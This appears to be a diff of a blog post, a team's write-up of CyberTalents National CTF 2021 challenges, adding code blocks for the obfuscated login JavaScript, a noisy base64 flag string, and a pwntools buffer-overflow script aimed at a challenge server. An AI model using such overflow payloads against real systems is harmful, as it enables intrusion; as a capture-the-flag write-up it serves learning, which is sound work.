@@ -39,20 +39,58 @@ My team and I recently took place in the CyberTalents National CTF 2021 where we
 
 Since the challenges are down, I will try my best to reconstruct the solutions
 
-#### Argos-web 50 pts
+### Argos-web 50 pts
 
 Argos was an ‘easy’ rated challenge, well some may tend to disagree :) This challenge was solved by @[k0imet](https://twitter.com/k0imet_)
 
 First step involved a directory bruteforce on the challenge link, which gave us a directory **java.php .** This page contained some obfuscated javascript that handled the authentication.
 
+```javascript
+'use strict';
 
+function _0x267a(_0x29ae1d, _0x59beb8) {
+  var _0x2dca0b = _0x2dca();
+  return _0x267a = function (_0x267a3d, _0x79f9b7) {
+    _0x267a3d = _0x267a3d - 0x116;
+    var _0x4cbcf2 = _0x2dca0b[_0x267a3d];
+    return _0x4cbcf2;
+  }, _0x267a(_0x29ae1d, _0x59beb8);
+}
+var _0x18eaa6 = _0x267a;
 
+function _0x2dca() {
+  var _0x4a962f = ['556864LePYhO', '93KGoDMv', 'wrong\x20Password', '14665ltxznd', '41121RGIWyS', '50236HEZbSV', '75OrlJRv', '260kpgQAa', '1316543gDJbid', '80096jdpdhM', 'value', '318iCKAiJ', '17205968dLvimS', 'getElementById', 'CT2021', '12SXIKHp', '232oiseyT'];
+  _0x2dca = function () {
+    return _0x4a962f;
+  };
+  return _0x2dca();
+}(function (_0x59e2bc, _0x3b27b9) {
+  var _0x3463b2 = _0x267a,
+    _0x486916 = _0x59e2bc();
+  while (!![]) {
+    try {
+      var _0x4861c6 = -parseInt(_0x3463b2(0x120)) / 0x1 + -parseInt(_0x3463b2(0x11d)) / 0x2 * (parseInt(_0x3463b2(0x119)) / 0x3) + -parseInt(_0x3463b2(0x121)) / 0x4 * (-parseInt(_0x3463b2(0x11e)) / 0x5) + -parseInt(_0x3463b2(0x123)) / 0x6 * (-parseInt(_0x3463b2(0x11b)) / 0x7) + -parseInt(_0x3463b2(0x117)) / 0x8 * (parseInt(_0x3463b2(0x11c)) / 0x9) + parseInt(_0x3463b2(0x11f)) / 0xa * (parseInt(_0x3463b2(0x118)) / 0xb) + -parseInt(_0x3463b2(0x116)) / 0xc * (-parseInt(_0x3463b2(0x124)) / 0xd);
+      if (_0x4861c6 === _0x3b27b9) break;
+      else _0x486916['push'](_0x486916['shift']());
+    } catch (_0x3e62db) {
+      _0x486916['push'](_0x486916['shift']());
+    }
+  }
+}(_0x2dca, 0xc909d));
+var _0xae5b = [_0x18eaa6(0x122), 'user', _0x18eaa6(0x125), 'pass', _0x18eaa6(0x126), '\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Congratz\x20\x0a\x0a', _0x18eaa6(0x11a)];
+
+function check() {
+  var _0x105bf3 = document[_0xae5b[0x2]](_0xae5b[0x1])[_0xae5b[0x0]],
+    _0xe27d13 = document[_0xae5b[0x2]](_0xae5b[0x3])[_0xae5b[0x0]];
+  _0x105bf3 == _0xae5b[0x4] && _0xe27d13 == _0xae5b[0x4] ? alert(_0xae5b[0x5]) : alert(_0xae5b[0x6]);
+};
+```
 
 The important function to look at is **check**. Towards the end a comparison is made and an alert is given. The alert was the error message shown if the login was correct or incorrect. We also have an array of strings and in the array is a string called ‘CT2021’
 
 This [writeup](https://hackersdad.medium.com/cybertalents-ctf-this-is-sparta-write-up-adb1fd0263e9) has a similar challenge and we can find out which variables are being passed. CT2021 was the user and pass for the website, which upon login gives us the flag.
 
-#### **Missing person-osint 50 pts**
+### Missing person-osint 50 pts
 
 In this challenge we had trace the most recent online activity of a missing person. We were given this [https://bitly.com/3frKIAX](https://bitly.com/3frKIAX) link which led us to a twitter account with protected tweets.
 
@@ -78,7 +116,7 @@ After thinking for a while. I decided to try and trace when the bit.ly was creat
 ![image](/posts/2021-09-12_cybertalents-national-ctf/images/5.png#layoutTextWidth)
 
 
-#### Laggy Decoder-secure coding 100pts
+### Laggy Decoder-secure coding 100pts
 
 In this challenge, we needed to fix the source code provided. The data being passed to the function was not being sanitized and one could achieve some XSS
 
@@ -87,10 +125,12 @@ Modify the utils file to . Submitting the modified code gives us the flag
 ![image](/posts/2021-09-12_cybertalents-national-ctf/images/6.png#layoutTextWidth)
 
 
-#### 64rev-cryptography 100pts
+### 64rev-cryptography 100pts
 
-This solution was curated by @[k0imet](https://twitter.com/k0imet_) and @[mystickev](https://twitter.com/mystic_kev) . We are given a base64 encode string fdXU1Z2hSRwIzaHAxQ8zcjNIX3MxNUdqaWRmPT09XiNUdqaWRmPT09XihkZCUtVGhncz8lHJmIzmh1dGRyZ0Zmd2dlfV8zcjNIX3MxX3IzaHAxQ18zNXIzdjNSXzNscG0zNV97Z2FsZgZGRmNVxQ18zanNnaGZkYWhocaWRmPT0TWNkc2hdXU1Z2hSRwIzaHAxQ8zcjNIX3MxNfV9fM3IzSF9zMV9yM2hwMUNfMzVyM3YzUl8zbHBtMzVfX3tnYWxm==
-
+This solution was curated by @[k0imet](https://twitter.com/k0imet_) and @[mystickev](https://twitter.com/mystic_kev) . We are given a base64 encode string 
+```
+fdXU1Z2hSRwIzaHAxQ8zcjNIX3MxNUdqaWRmPT09XiNUdqaWRmPT09XihkZCUtVGhncz8lHJmIzmh1dGRyZ0Zmd2dlfV8zcjNIX3MxX3IzaHAxQ18zNXIzdjNSXzNscG0zNV97Z2FsZgZGRmNVxQ18zanNnaGZkYWhocaWRmPT0TWNkc2hdXU1Z2hSRwIzaHAxQ8zcjNIX3MxNfV9fM3IzSF9zMV9yM2hwMUNfMzVyM3YzUl8zbHBtMzVfX3tnYWxm==
+```
 Using cyberchef to decode , you can pick out bits of the flag in the output i.e 1s_H3r3
 
 ![image](/posts/2021-09-12_cybertalents-national-ctf/images/7.png#layoutTextWidth)
@@ -103,7 +143,7 @@ So our goal is to remove noise from the base64 string by removing some chunks of
 
 We get 2 flags. One of them was the answer
 
-#### **Red pipe -machines 100pts**
+### Red pipe -machines 100pts
 
 For this challenge, we are given an IP for a machine. We need to gain a shell and get the flag.
 
@@ -125,7 +165,7 @@ We get a shell
 ![image](/posts/2021-09-12_cybertalents-national-ctf/images/12.png#layoutTextWidth)
 
 
-#### Roony-forensics 100pts
+### Roony-forensics 100pts
 
 This was a simple forensics challenge that required us to utilize a registry explorer tool to find the most recent executed application
 
@@ -148,12 +188,32 @@ Use the registry key — ‘recent file list’ to get the most recent execu
 
 The flag was gpedit.msc
 
-#### Ch4nger —Exploitation 50 pts easy
+### Ch4nger —Exploitation 50 pts easy
 
 This solution was curated by my teammate @[gilbert](https://twitter.com/BinaryChunk). It is a simple buffer overflow challenge where we need to overwrite the return address with _0x_deadbeef
 
 We can solve the challenge using pwntools as follows
+```python3
+#!/usr/bin/python3
 
+from pwn import * 
+
+
+filename = "./chall"
+
+#io = process(filename)
+io = remote("3.122.102.231", 6666)
+context.clear(arch="i386")
+
+def main():
+	payload = b"A"*200 + p32(0xdeadbeef)
+	io.sendline(payload)
+	flag = io.recvline().decode().strip()
+	log.info("The final flag is: \n\t %s" % flag)
+
+if __name__ == "__main__":
+	main()
+```
 
 
 
